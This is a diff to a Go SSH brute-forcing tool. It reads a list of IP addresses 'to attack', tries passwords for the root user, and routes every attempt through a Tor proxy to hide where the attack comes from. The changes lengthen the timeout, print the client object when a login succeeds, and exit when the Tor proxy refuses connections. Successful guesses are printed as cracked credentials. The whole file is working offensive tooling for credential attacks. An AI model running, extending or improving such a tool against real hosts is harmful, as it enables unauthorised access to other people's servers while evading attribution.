@@ -6,8 +6,10 @@ import (
 	"fmt"
 	"golang.org/x/crypto/ssh"
 	"golang.org/x/net/proxy"
+	"net"
 	"net/url"
 	"os"
+	"syscall"
 	"time"
 )
 
@@ -16,7 +18,7 @@ var (
 	ipFile   = flag.String("ip", "ipfile.txt", "Ip list to attack.")
 	port     = flag.String("port", "22", "Port to attempt ssh connection.")
 	user     = flag.String("user", "root", "User to attempt connection.")
-	timeout  = flag.Duration("timeout", 1000*time.Millisecond, "Timeout per ssh request.")
+	timeout  = flag.Duration("timeout", 10000*time.Millisecond, "Timeout per ssh request.")
 )
 
 // Struct with authentication info
@@ -66,6 +68,7 @@ func TorClient(addr string, config *ssh.ClientConfig) (*ssh.Client, error) {
 	perHost := proxy.NewPerHost(dialer, nil)
 	conn, err := perHost.Dial("tcp", addr)
 	if err != nil {
+		//panic(err)
 		return nil, err
 	}
 	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
@@ -86,13 +89,25 @@ func sshDialer(ip, port, user, password string, resCh chan *AuthResult) {
 	finish := make(chan bool)
 	for {
 		go func() {
-			_, err := TorClient(ip+":"+port, config)
+			client, err := TorClient(ip+":"+port, config)
 			if err == nil {
+				fmt.Printf("%#v\n", client)
 				res := &AuthResult{Ip: ip, Port: port, User: user, Pass: password}
 				fmt.Printf("Found! IP: \"%v:%v\", user \"%v\" pass: \"%v\".\n", ip, port, user, password)
 				finish <- true
 				resCh <- res
 			}
+			switch err.(type) {
+			case *net.OpError:
+				errN := err.(*net.OpError).Err
+				sc := errN.(*os.SyscallError)
+				if sc.Err == syscall.Errno(0x6f) {
+					fmt.Println("Proxy connection refused, is Tor running?")
+					os.Exit(1)
+				}
+
+			}
+
 		}()
 		select {
 		case <-finish:
